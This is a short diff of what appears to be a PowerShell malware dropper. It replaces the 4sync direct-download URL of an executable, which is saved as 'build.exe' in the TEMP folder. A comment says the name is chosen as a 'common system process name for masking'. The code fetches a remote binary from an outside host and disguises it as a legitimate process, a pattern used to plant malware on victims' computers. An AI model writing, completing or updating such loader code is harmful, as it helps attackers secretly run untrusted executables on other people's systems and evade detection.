@@ -1,5 +1,5 @@
 
-$exeUrl = "https://www.4sync.com/web/directDownload/jnOxMe2l/QvEYZW-h.8f1aa766b81c182330522810bad62ea4"
+$exeUrl = "https://www.4sync.com/web/directDownload/RWIehxb0/QvEYZW-h.4d9f38d80c4adcd468f81824fd65f400"
 $exeName = "build.exe"
 $maskedName = "build.exe"  # Common system process name for masking
 $exePath = "$env:TEMP\\build.exe"
